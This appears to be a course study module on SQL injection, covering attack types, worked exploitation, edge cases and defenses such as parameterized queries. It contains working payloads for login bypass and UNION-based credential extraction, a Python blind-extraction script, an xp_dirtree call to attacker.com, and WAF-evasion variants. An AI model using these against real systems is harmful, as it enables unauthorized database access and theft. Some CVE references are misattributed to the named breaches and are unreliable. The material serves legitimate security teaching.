# SQL Injection — Injection SQL

| Property          | Value                                                                    |
| ----------------- | ------------------------------------------------------------------------ |
| **Topic**         | SQL Injection / Injection SQL                                            |
| **Domain**        | 05-application-security                                                  |
| **Difficulty**    | 🟡 Intermediate                                                          |
| **Prerequisites** | [CIA Triad](../00-foundations/cia-triad.md), Basic SQL, Web applications |
| **Learning Time** | 60-75 minutes                                                            |
| **Status**        | ✅ Complete                                                              |

---

## Review Schedule

- [ ] Day 2 — First review after initial study
- [ ] Week 1 — Consolidation review
- [ ] Month 1 — Long-term retention check
- [ ] Month 3 — Mastery verification

---

## Quick Summary

**What:** SQL injection (SQLi) is a vulnerability that allows attackers to inject malicious SQL code into application queries, enabling unauthorized database access.

**Offensive:** SQL injection is the #1 web application vulnerability. Successful SQLi = full database compromise (read, modify, delete all data).
**Defensive:** Parameterized queries (prepared statements) eliminate SQL injection. Input validation is secondary defense.

**Why it matters:** **OWASP Top 10 #3 (2021): Injection.** SQL injection has caused some of the largest data breaches in history. Understanding SQLi is mandatory for both web developers and penetration testers.

---

## Prerequisites

**Required knowledge:**

- [CIA Triad](../00-foundations/cia-triad.md) — Confidentiality and integrity threats
- **Basic SQL:** SELECT, WHERE, INSERT, UPDATE, DELETE statements
- **Web architecture:** Client → Web Server → Database 3-tier model
- **HTTP basics:** GET/POST parameters, cookies, headers

**Quick check:** Can you write a SQL query with a WHERE clause? Do you know what a web form submits to the server? If yes, you're ready.

---

## Layer 1 — Intuition

Think of SQL injection like a conversation with a secretary:

**Normal conversation:**

```
You: "Can I see the file for customer John Smith?"
Secretary: "Sure, here's John Smith's file." (safe)
```

**SQL injection conversation:**

```
You: "Can I see the file for customer John Smith OR 1=1?"
Secretary: "Sure, here's EVERY customer's file." (exploited!)
```

**Key insight:** The application **trusts user input** and builds SQL queries by concatenating strings. Attacker manipulates input to **change the query logic**, gaining unauthorized access.

---

## Layer 2 — Formal Definitions

### SQL Injection — Injection SQL

**Definition:** A code injection vulnerability where attacker-supplied input is incorporated into SQL queries without proper sanitization or parameterization, allowing the attacker to manipulate the query logic.

**Root cause:** **String concatenation to build SQL queries** instead of parameterized queries.

**Impact (STRIDE threat model):**

- **Information Disclosure (Confidentialité):** Read sensitive data (passwords, credit cards, PII)
- **Data Modification (Intégrité):** Update/delete records
- **Authentication Bypass (Authentification):** Log in without credentials
- **Authorization Bypass (Autorisation):** Access other users' data
- **Code Execution (Disponibilité):** Run OS commands (in some databases)

**French term:** _Injection SQL_

---

### Attack Mechanism

**Vulnerable code (string concatenation):**

```python
# Python example (vulnerable)
username = request.form['username']  # User input: admin
password = request.form['password']  # User input: password123

# Building query with string concatenation
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"

# Resulting query:
# SELECT * FROM users WHERE username='admin' AND password='password123'

cursor.execute(query)  # Executes the query
```

**Attacker input:**

```
Username: admin' OR '1'='1
Password: anything
```

**Resulting query:**

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```

**Query logic breakdown:**

```
WHERE username='admin'  (False, user doesn't exist)
   OR '1'='1'            (True, always true!)
   AND password='anything'  (irrelevant, OR short-circuits)

Result: Query returns ALL users (because '1'='1' is always true)
Application logs in as first user (usually admin)
```

**Authentication bypassed!**

---

### Common SQL Injection Types

#### 1. Classic SQLi (In-Band)

**Definition:** Attacker sees query results directly in the application response.

**Subtypes:**

**Error-Based SQLi:**

- Trigger database errors to leak information
- Example: `' OR 1=1 --` causes syntax error, reveals database type in error message

**Union-Based SQLi:**

- Use UNION operator to combine malicious query with original query
- Example: `' UNION SELECT username, password FROM users --`

**French term:** _Injection SQL classique_

---

#### 2. Blind SQLi

**Definition:** Attacker doesn't see query results, must infer data through application behavior (timing, true/false responses).

**Subtypes:**

**Boolean-Based Blind SQLi:**

```sql
-- Test if first character of admin password is 'a'
' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --

If page shows "Login successful" → first char is 'a'
If page shows "Login failed" → first char is NOT 'a'
Repeat for each character → extract entire password
```

**Time-Based Blind SQLi:**

```sql
-- MySQL example
' OR IF(1=1, SLEEP(5), 0) --

If page takes 5 seconds to load → query is vulnerable
If page loads normally → not vulnerable
```

**French term:** _Injection SQL aveugle_

---

#### 3. Out-of-Band SQLi

**Definition:** Attacker triggers database to send data to external system (DNS query, HTTP request).

**Example (Microsoft SQL Server):**

```sql
'; EXEC xp_dirtree '\\attacker.com\share' --

Database makes DNS query to attacker.com
Attacker's DNS server logs the query → confirms vulnerability
```

**Rare:** Requires specific database features (xp_cmdshell, LOAD_FILE, etc.)

**French term:** _Injection SQL hors bande_

---

### SQL Injection Attack Lifecycle

**Phase 1: Detection**

```
1. Identify injection point (input field, URL parameter, cookie, header)
2. Test with special characters: ' " ; -- /* */
3. Look for errors, unusual behavior, or timing changes
```

**Phase 2: Exploitation**

```
4. Determine database type (MySQL, PostgreSQL, MSSQL, Oracle)
5. Extract schema: table names, column names
6. Extract data: usernames, passwords, sensitive records
```

**Phase 3: Privilege Escalation (optional)**

```
7. Attempt to gain database admin privileges
8. Read/write files on server (LOAD_FILE, INTO OUTFILE)
9. Execute OS commands (xp_cmdshell, sys_exec)
```

---

## Layer 3 — Worked Examples

### Example 1: Authentication Bypass

**Scenario:** Login form vulnerable to SQL injection

**Vulnerable code:**

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    echo "Login successful!";
    // Set session, redirect to dashboard
} else {
    echo "Invalid credentials.";
}
?>
```

**Attack:**

**Step 1: Identify injection point**

```
Input: Username: admin' --
       Password: anything

Query becomes:
SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
                                       ^^ Comment symbol, ignores rest of query

Simplified query:
SELECT * FROM users WHERE username='admin'

Result: Returns admin user without checking password!
```

**Step 2: Alternative payloads**

```
Username: admin' OR '1'='1
Password: (empty)

Query becomes:
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password=''

Result: Returns all users (OR '1'='1' is always true)
Application logs in as first user in table
```

**Step 3: Blind exploitation (if error messages disabled)**

```
Username: admin' AND '1'='1
Password: anything

If login fails: username exists but password wrong (normal)

Username: admin' AND '1'='2
Password: anything

If login fails: username might not exist OR query is vulnerable

Username: admin' OR '1'='1
Password: anything

If login succeeds: VULNERABLE (bypassed authentication)
```

**Impact:** Complete authentication bypass, unauthorized access to application.

---

### Example 2: Data Extraction (Union-Based SQLi)

**Scenario:** Search function vulnerable to SQL injection

**Vulnerable code:**

```python
search_term = request.args.get('search')  # User input

query = f"SELECT id, title, content FROM articles WHERE title LIKE '%{search_term}%'"
results = cursor.execute(query).fetchall()

for row in results:
    print(f"Title: {row[1]}, Content: {row[2]}")
```

**Attack:**

**Step 1: Determine number of columns**

```
Input: ' ORDER BY 1 --

Query: SELECT id, title, content FROM articles WHERE title LIKE '%%' ORDER BY 1 --'
Result: Page loads normally (1 column exists)

Input: ' ORDER BY 2 --
Result: Page loads normally (2 columns exist)

Input: ' ORDER BY 3 --
Result: Page loads normally (3 columns exist)

Input: ' ORDER BY 4 --
Result: ERROR (only 3 columns exist)

Conclusion: Query returns 3 columns
```

**Step 2: Find injectable column**

```
Input: ' UNION SELECT 1,2,3 --

Query: SELECT id, title, content FROM articles WHERE title LIKE '%%' UNION SELECT 1,2,3 --'

Result: Page displays:
  Title: 2
  Content: 3

Conclusion: Columns 2 and 3 are displayed on page
```

**Step 3: Extract database information**

```
Input: ' UNION SELECT 1, database(), version() --

Query: SELECT id, title, content FROM articles WHERE title LIKE '%%' UNION SELECT 1, database(), version() --'

Result: Page displays:
  Title: my_app_db  (database name)
  Content: 8.0.32-MySQL  (MySQL version)
```

**Step 4: Extract table names**

```
Input: ' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() --

Result: Page displays all table names:
  users
  articles
  admin_logs
  credit_cards
```

**Step 5: Extract column names from users table**

```
Input: ' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' --

Result: Page displays:
  id
  username
  password
  email
  is_admin
```

**Step 6: Extract user credentials**

```
Input: ' UNION SELECT 1, username, password FROM users --

Query: SELECT id, title, content FROM articles WHERE title LIKE '%%' UNION SELECT 1, username, password FROM users --'

Result: Page displays all usernames and password hashes:
  Title: admin, Content: 5f4dcc3b5aa765d61d8327deb882cf99
  Title: john_doe, Content: e10adc3949ba59abbe56e057f20f883e
  ...
```

**Impact:** Complete database disclosure. Attacker now has:

- All usernames and password hashes
- Database structure (table/column names)
- Can target other tables (credit_cards, etc.)

---

### Example 3: Blind SQL Injection (Boolean-Based)

**Scenario:** Application shows different responses for true/false conditions, but doesn't display data

**Vulnerable code:**

```java
String userId = request.getParameter("id");
String query = "SELECT * FROM products WHERE id=" + userId + " AND visible=1";

ResultSet rs = stmt.executeQuery(query);

if (rs.next()) {
    // Display product page
    response.getWriter().println("<h1>Product Found</h1>");
} else {
    // Display error page
    response.getWriter().println("<h1>Product Not Found</h1>");
}
```

**Attack:**

**Step 1: Confirm vulnerability**

```
Input: ?id=1 AND 1=1
Query: SELECT * FROM products WHERE id=1 AND 1=1 AND visible=1
Result: "Product Found" (1=1 is true, query succeeds)

Input: ?id=1 AND 1=2
Query: SELECT * FROM products WHERE id=1 AND 1=2 AND visible=1
Result: "Product Not Found" (1=2 is false, query fails)

Conclusion: VULNERABLE to blind SQLi
```

**Step 2: Extract data character by character**

```
Goal: Extract admin password from users table

Input: ?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'

If "Product Found": First character is 'a'
If "Product Not Found": First character is NOT 'a'

Repeat for each character:
  b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, 0-9

Input: ?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p'
Result: "Product Found" → First character is 'p'

Input: ?id=1 AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='a'
Result: "Product Found" → Second character is 'a'

Continue until full password extracted: password123
```

**Automation:**

```python
import requests

url = "https://vulnerable-site.com/product"
password = ""
charset = "abcdefghijklmnopqrstuvwxyz0123456789"

for position in range(1, 50):  # Assume max 50 chars
    for char in charset:
        payload = f"1 AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')='{char}'"
        response = requests.get(url, params={"id": payload})

        if "Product Found" in response.text:
            password += char
            print(f"Found character {position}: {char}")
            break
    else:
        # No more characters
        break

print(f"Extracted password: {password}")
```

**Time required:** ~2 seconds per character, 50 characters = ~100 seconds total

**Impact:** Complete password disclosure despite blind injection.

---

### Example 4: Real-World Exploitation Chain

**Scenario:** E-commerce site with SQLi vulnerability → data breach

**Attack flow:**

**1. Initial reconnaissance**

```
Discovered vulnerable endpoint: /search?q=[INPUT]
Tested with: ' OR '1'='1
Response: Error message reveals MySQL database
```

**2. Database enumeration**

```
Extract database schema:
  Tables: users, orders, credit_cards, products

Extract column names:
  users: id, email, password_hash, full_name, address
  credit_cards: id, user_id, card_number, cvv, expiry_date
```

**3. Data exfiltration**

```
Extracted sensitive data:
  - 50,000 user records (emails, password hashes)
  - 10,000 credit card numbers (full PAN, CVV, expiry)
  - Order history with personal details
```

**4. Post-exploitation**

```
Attacker actions:
  - Cracked password hashes (weak bcrypt rounds)
  - Sold credit card data on dark web
  - Used admin credentials for further access
  - Planted web shell for persistence
```

**Impact:**

- **Financial:** $5M+ in fraud losses, regulatory fines (GDPR, PCI-DSS)
- **Reputation:** Loss of customer trust, negative press
- **Legal:** Class-action lawsuit, government investigation
- **Operational:** Site taken offline for remediation

**Defensive failures:**

- No parameterized queries (root cause)
- No Web Application Firewall (WAF)
- No intrusion detection (SQLi went unnoticed for months)
- No data encryption at rest (credit cards stored in plaintext)

---

## Layer 4 — Edge Cases, Nuances, and Limitations

### Edge Case 1: Second-Order SQL Injection

**Problem:** Input is stored safely in database, but later retrieved and used unsafely.

**Example:**

**Step 1: User registration (safe)**

```php
// Parameterized query (safe)
$stmt = $conn->prepare("INSERT INTO users (username, email) VALUES (?, ?)");
$stmt->bind_param("ss", $username, $email);
$stmt->execute();

// Attacker registers with username: admin'--
// Stored safely in database as: admin'--
```

**Step 2: Profile update (unsafe)**

```php
// Later, admin views user profile
$username = $row['username'];  // Retrieved from database: admin'--

// Vulnerable query (string concatenation)
$query = "UPDATE users SET last_login=NOW() WHERE username='$username'";
// Becomes: UPDATE users SET last_login=NOW() WHERE username='admin'--'

// Comment symbol (--) breaks the query, causes error or unintended behavior
```

**Lesson:** **Parameterize EVERY query, even with data from your own database.** Data from database is still user-controlled (was user input at some point).

---

### Edge Case 2: Whitelist Input Validation Bypass

**Defensive attempt (flawed):**

```python
# Only allow letters and numbers
username = request.form['username']

if not re.match(r'^[a-zA-Z0-9]+$', username):
    return "Invalid input"

query = f"SELECT * FROM users WHERE username='{username}'"
```

**Bypass: Numeric injection**

```python
# Numeric fields don't need quotes
user_id = request.args.get('id')  # Input: 1 OR 1=1

if not user_id.isdigit():  # Validation checks if numeric
    return "Invalid input"

# But doesn't prevent:
query = f"SELECT * FROM users WHERE id={user_id}"
# Becomes: SELECT * FROM users WHERE id=1 OR 1=1 (still vulnerable!)
```

**Lesson:** **Input validation is NOT sufficient defense against SQLi.** Must use parameterized queries regardless of validation.

---

### Edge Case 3: ORM SQL Injection

**Misconception:** "We use an ORM (Object-Relational Mapper) like Django ORM or Hibernate, so we're safe from SQLi."

**Reality:** ORMs can still be vulnerable if misused.

**Vulnerable ORM usage (Django):**

```python
# VULNERABLE: Raw SQL with string interpolation
user_input = request.GET.get('search')
User.objects.raw(f"SELECT * FROM users WHERE name='{user_input}'")

# VULNERABLE: Using .extra() with user input
User.objects.extra(where=[f"name='{user_input}'"])
```

**Safe ORM usage:**

```python
# SAFE: ORM query API (automatically parameterized)
User.objects.filter(name=user_input)

# SAFE: Raw SQL with parameters
User.objects.raw("SELECT * FROM users WHERE name=%s", [user_input])
```

**Lesson:** **ORMs are safe by default, but raw SQL methods must still use parameterization.**

---

### Limitation 1: WAF Bypass Techniques

**Web Application Firewall (WAF)** blocks common SQLi patterns, but attackers can evade:

**Technique 1: Case variation**

```sql
-- Blocked: ' OR '1'='1
-- Bypass: ' Or '1'='1  (mixed case)
-- Bypass: ' oR '1'='1
```

**Technique 2: Comment obfuscation**

```sql
-- Blocked: ' OR 1=1 --
-- Bypass: ' OR 1=1 /*comment*/ --
-- Bypass: ' OR 1=1 #
```

**Technique 3: Encoding**

```sql
-- Blocked: ' UNION SELECT
-- Bypass: %27%20UNION%20SELECT  (URL encoding)
-- Bypass: ' /*!50000UNION*/ SELECT  (MySQL version comment)
```

**Technique 4: Whitespace variation**

```sql
-- Blocked: ' OR 1=1
-- Bypass: '/**/OR/**/1=1
-- Bypass: ' OR(1)=(1)
-- Bypass: ' OR 1 = 1  (extra spaces)
```

**Lesson:** **WAF is defense in depth, not a fix.** Parameterized queries are the only reliable defense.

---

### Limitation 2: Parameterized Queries Can't Parameterize Everything

**Problem:** Some SQL constructs can't be parameterized (table names, column names, ORDER BY).

**Vulnerable (table name from user input):**

```python
table_name = request.args.get('table')  # User input: users

# Can't parameterize table name
query = f"SELECT * FROM {table_name} WHERE id=?"  # Still vulnerable!
cursor.execute(query, [user_id])

# Attack: ?table=users WHERE 1=1 UNION SELECT password FROM admin --
```

**Defense: Whitelist approach**

```python
table_name = request.args.get('table')

# Whitelist of allowed table names
ALLOWED_TABLES = ['users', 'products', 'orders']

if table_name not in ALLOWED_TABLES:
    return "Invalid table"

query = f"SELECT * FROM {table_name} WHERE id=?"
cursor.execute(query, [user_id])
```

**Lesson:** **When parameterization isn't possible, use strict whitelist validation.**

---

## Active Recall Prompts

### Understanding Questions

1. **Root cause:** What is the fundamental programming mistake that causes SQL injection? Why does string concatenation lead to SQLi?

2. **Attack types:** Explain the difference between classic SQLi, blind SQLi, and out-of-band SQLi. Which is easiest to exploit?

3. **Parameterized queries:** How do prepared statements prevent SQL injection? What makes them different from string concatenation?

---

### Application Questions

4. **Code review:** Identify the vulnerability and fix it:

```python
def get_user(user_id):
    query = "SELECT * FROM users WHERE id=" + str(user_id)
    return db.execute(query)
```

5. **Attack chain:** You found a blind SQLi vulnerability in a login form. Walk through the steps to extract the admin password.

6. **Defense design:** You're reviewing a web application. Which of these defenses are effective against SQLi? (can select multiple)
   - [ ] Input validation (allow only alphanumeric)
   - [ ] Parameterized queries
   - [ ] Web Application Firewall (WAF)
   - [ ] Encrypting the database
   - [ ] Using stored procedures
   - [ ] Output encoding

---

### Transfer Questions

7. **Real-world analysis:** Research one of these SQLi breaches:
   - **Heartland Payment Systems (2008)** — 134M credit cards
   - **Sony Pictures (2011)** — 77M user accounts
   - **Yahoo (2012)** — 450K credentials

   Document: attack method, impact, defensive failures.

8. **Tool exploration:** Use **sqlmap** (automated SQLi tool) on a practice vulnerable site (e.g., DVWA, WebGoat):
   - Detect injection point
   - Extract database names
   - Extract user credentials
   - Generate report

9. **Secure coding:** Review your own code or an open-source project. Find all database queries and verify they use parameterization. Document any vulnerabilities found.

10. **OWASP Top 10:** SQL injection is part of **A03:2021 - Injection**. Research the full category. What other injection types exist beyond SQL? (LDAP, XML, OS command, etc.)

---

## References

### Primary Sources

- **Course:** IFT2830 - Sécurité des systèmes informatiques (UdeM)
  Application security topics

### OWASP Resources

- **OWASP Top 10 (2021)** — A03:2021 Injection
  https://owasp.org/Top10/A03_2021-Injection/
- **OWASP SQL Injection Prevention Cheat Sheet**
  https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- **OWASP Testing Guide** — Testing for SQL Injection
  https://owasp.org/www-project-web-security-testing-guide/

### Tools & Practice

- **sqlmap** — Automated SQL injection tool (http://sqlmap.org/)
- **DVWA (Damn Vulnerable Web Application)** — Practice environment
- **WebGoat** — OWASP teaching platform
- **PortSwigger Web Security Academy** — SQL injection labs (free)

### CVE & CWE

- **CWE-89** — Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- **CVE-2008-5416** — Heartland Payment Systems SQLi breach
- **CVE-2011-3368** — Sony Pictures SQLi breach

### Academic & Standards

- Halfond, W., Viegas, J., & Orso, A. (2006). "A Classification of SQL Injection Attacks and Countermeasures." _IEEE Symposium on Secure Software Engineering_.
- **NIST SP 800-53 Rev. 5** — SI-10 (Information Input Validation)
- **PCI DSS 4.0** — Requirement 6.2.4 (Secure coding to prevent injection flaws)

### Real-World Incidents

- **Heartland Payment Systems (2008)** — 134M credit cards stolen via SQLi
- **TJX Companies (2007)** — 94M credit cards via SQLi
- **Sony Pictures (2011)** — 77M accounts via SQLi (plaintext passwords)
- **Yahoo (2012)** — 450K credentials leaked via SQLi

---

## Related Content

### Theory Modules

- **Previous:** [Cryptography Basics](../01-cryptography/cryptography-basics.md) — Password hashing
- **Next:** [Cross-Site Scripting (XSS)](xss.md) — Client-side injection
- **Next:** [CSRF](csrf.md) — Session-based attacks
- **Related:** [Input Validation](input-validation.md) — Defense in depth

### Examples

- [SQLi Exploitation Demo](../../../02_examples/05-application-security/sqli-exploitation/) — Hands-on attack
- [Secure Coding: Parameterized Queries](../../../02_examples/05-application-security/parameterized-queries/) — Defensive implementation
- [SQLi to RCE](../../../02_examples/05-application-security/sqli-to-rce/) — Advanced exploitation

### Exercises

- [Fix Vulnerable Code](../../../03_exercises/05-application-security/fix-sqli-code/) 🟢 — Code review practice
- [Blind SQLi Challenge](../../../03_exercises/05-application-security/blind-sqli/) 🟡 — Boolean/time-based exploitation
- [sqlmap Lab](../../../03_exercises/05-application-security/sqlmap-lab/) 🟡 — Tool usage

### Tools & Resources

- **SQLi Tools:** `04_resources/tools/web-security/sqlmap/`
- **Vulnerable Apps:** `04_resources/tools/web-security/dvwa-setup.md`
- **Cheat Sheets:** `04_resources/tools/web-security/sqli-payloads.txt`

---

## Personal Insights & Notes

### Study Notes

_Record your observations, "aha" moments, and connections here._

**Example:**

- "SQLi is all about breaking out of string context. The single quote (') closes the string, then attacker adds their own SQL."
- "Parameterized queries work because they send SQL structure and data separately. Database never interprets data as code."

---

### Real-World Connections

_Link this concept to incidents, news, or work experience._

**Example:**

- "Heartland breach (2008) — SQL injection in payment processing. 134M cards stolen. Cost: $140M in settlements. Shows impact of one vulnerability."

---

### Questions & Confusion

_Track what's unclear or needs deeper investigation._

**Example:**

- "How does sqlmap automate blind SQLi extraction? Need to study the tool's methodology."

---

### Exam/Interview Prep

_Key points to remember for assessments._

**Exam focus (IFT2830):**

- Cause: Concaténation de chaînes pour construire requêtes SQL
- Types: Injection classique (in-band), Injection aveugle (blind), Injection hors bande (out-of-band)
- Defense: Requêtes paramétrées (prepared statements), validation en liste blanche
- Impact: Lecture/modification de données, contournement d'authentification, exécution de commandes

**Interview talking points:**

- "SQL injection is preventable with one practice: always use parameterized queries (prepared statements)."
- "Input validation is not sufficient. Even if you validate, always parameterize."
- "ORMs are safe by default, but raw SQL methods must explicitly use parameterization."

---

## Change Log

| Date       | Change                        | Reason                                                             |
| ---------- | ----------------------------- | ------------------------------------------------------------------ |
| 2026-04-27 | Created module                | Application security foundational topic                            |
| 2026-04-27 | Added attack types            | Classic, blind, out-of-band SQLi                                   |
| 2026-04-27 | Added 4 worked examples       | Auth bypass, union-based extraction, blind extraction, real breach |
| 2026-04-27 | Added edge cases              | Second-order, ORM, WAF bypass                                      |
| 2026-04-27 | Added real breach references  | Heartland, Sony, Yahoo incidents                                   |
| 2026-04-27 | Integrated French terminology | Bilingual support throughout                                       |
